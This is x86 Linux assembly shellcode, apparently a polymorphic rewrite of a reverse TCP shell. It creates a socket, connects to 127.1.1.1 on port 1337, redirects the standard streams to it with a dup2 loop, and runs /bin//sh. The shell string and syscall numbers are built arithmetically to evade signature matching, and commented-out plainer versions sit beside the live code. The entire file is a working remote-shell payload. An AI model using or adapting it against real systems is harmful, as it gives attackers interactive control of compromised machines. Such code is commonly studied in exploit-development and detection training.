section .text

       global _start

_start:

	xor eax, eax
	cwd		;edx 0
	xor ebx, ebx
	mov al, 0x22	;eax 22
	mov bl, 0x5
	push ebx
	sub ebx, 0x4
	push ebx
	inc ebx
	push ebx
	xor ecx, ecx
	mov ecx, esp
	dec ebx
	add eax, 0x22
	add eax, 0x22
	int 0x80

	
	;push 0x66
	;pop eax
	;push 0x1
	;pop ebx
	;xor edx, edx
	;push edx
	;push ebx
	;push 0x2
	;mov ecx, esp
	;int 0x80
	
	xchg edx, eax
	mov al, 0x66
	push 0x101017f
	push word 0x3905
	inc ebx
	push bx
	mov ecx, esp
	push 0x10
	push ecx
	push edx
	mov ecx, esp
	inc ebx
	int 0x80
	push 0x2
	pop ecx
	xchg edx, ebx

loop:
	mov al, 0x3f
	int 0x80
	dec ecx
	jns loop

	push 0xc
	pop eax
	push 0x2
	pop ecx
	dec eax
	dec ecx
	xor edx, edx
	mov [esp-4], edx
	sub esp, 0x4
	push 0x57621e1e
	pop ecx
	add ecx, 0x11111111
	push ecx
	push 0x6e69622f
	mov ebx, esp
	xor ecx, ecx
	int 0x80

	;mov al, 0xb
	;inc ecx
	;mov edx, ecx
	;push edx
	;push 0x68732f2f
	;push 0x6e69622f
	;mov ebx, esp
	;int 0x80
